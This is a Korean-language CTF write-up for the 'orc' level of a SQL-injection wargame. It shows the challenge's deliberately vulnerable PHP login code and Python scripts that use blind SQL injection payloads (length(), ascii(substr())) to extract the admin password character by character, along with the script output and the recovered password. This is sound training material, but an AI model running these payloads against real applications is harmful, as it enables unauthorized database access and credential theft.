# orc

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- GET 방식으로 pw를 받는다.
- solve 함수를 실행시키려면, 정확한 admin pw를 알아야 한다.
&rarr; `blind-sqlinjection` 을 활용하여 구한다.

## 3. Solution
Python을 이용하여 크게 총 두 번의 sqli를 진행할 것이다.
1. pw의 길이
2. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`pw` | 1234' or id='admin' and length(pw)=i #


우선, `length` 함수를 이용하여 길이를 구할것이다.
여기서 중요한 점은, pw조건 앞에 `id='admin'`을 추가해 줌으로서
다른 계정의 pw와 혼동되는 오류가 발생하지 않도록 하는 것이다.

이후, 비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```pyhton
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?\
            pw=1234' or id='admin' and length(pw)=%d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw
변수명 | 값
---|---:
`pw` | 1234' or id='admin' and ascii(substr(pw,i,1))=j #


pw를 한문자씩 쪼개어 ascii 코드값 비교를 할 것이다.
- 쪼개는 부분은 `substr` 함수를 이용한다.
&rarr; substr(문자열, 시작위치, 길이)
- `ascii` 함수를 통해 ascii 값을 알아낸다.

스크립트 속 변수 `i`와 `j`를 두는데, 역할은 다음과 같다.
변수명 | 값
---|---:
`i` | pw의 한 문자 index
`j` | 문자 값 비교를 위한 변수 (33 ~ 126)

a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?\
            pw=1234' or id='admin' and length(pw)=%d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?\
                pw=1234' or id='admin' and ascii(substr(pw,%d,1))=%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : 0
pw(2) : 09
pw(3) : 095
pw(4) : 095a
pw(5) : 095a9
pw(6) : 095a98
pw(7) : 095a985
pw(8) : 095a9852
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.
변수명 | 값
---|---:
`pw` | 095a9852